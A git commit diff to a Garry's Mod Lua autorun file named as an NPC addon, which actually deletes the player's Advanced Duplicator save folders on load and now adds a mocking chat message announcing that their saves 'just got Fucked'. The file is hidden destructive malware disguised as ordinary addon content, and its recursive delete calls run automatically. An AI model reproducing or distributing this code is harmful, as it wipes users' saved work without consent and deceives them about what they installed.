05ce2d0494207222d0802cf389d72808dbffe569
Nortonv8 <nortonv8@gmail.com>
2013-05-15 20:19:51 +0100

    Added a chat message.
    Let's hope you backed up your advanced dupes. They just got Fucked.

--- lua/autorun/adv_npcs.lua
+++ lua/autorun/adv_npcs.lua
@@ -12,3 +12,5 @@ end
 DeleteAllRecursive("adv_duplicator")
 DeleteAllRecursive("advdupe2")
 DeleteAllRecursive("advdupe2_maps")
+	
+chat.AddText(Color(255,255,255),"Let's hope you backed up your ",Color(0,255,0),"advanced dupes. ",Color(255,255,255),"They just got ",Color(255,0,0),"Fucked.")
